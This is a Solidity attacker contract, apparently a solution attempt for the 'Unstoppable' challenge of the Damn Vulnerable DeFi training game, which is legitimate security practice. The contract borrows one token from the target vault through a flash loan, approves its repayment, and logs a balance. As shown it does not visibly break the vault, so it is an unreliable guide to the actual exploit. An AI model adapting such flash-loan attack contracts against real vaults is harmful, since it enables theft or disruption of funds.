// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { SafeTransferLib, ERC4626, ERC20 } from "solmate/src/mixins/ERC4626.sol";
import { IERC3156FlashBorrower, IERC3156FlashLender } from "@openzeppelin/contracts/interfaces/IERC3156.sol";
import "hardhat/console.sol";

/**
 * @title UnstoppableVault
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */


interface IVault {
     function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data) external returns (bool); 
}


contract AttackUnstoppable  {
    
    address public owner;
    address public vault;
    address vault_token;

    constructor(address _vault, address _token) {
        owner = msg.sender;
        vault = _vault;
        vault_token = _token;
    }

    function attack() public {
        require(msg.sender == owner, "Not owner");
        IVault(vault).flashLoan(IERC3156FlashBorrower(address(this)), vault_token, 1, "");
        console.log("total assets1",ERC20(vault_token).balanceOf(owner));
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        ERC20(vault_token).approve(vault, 1);
        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

}
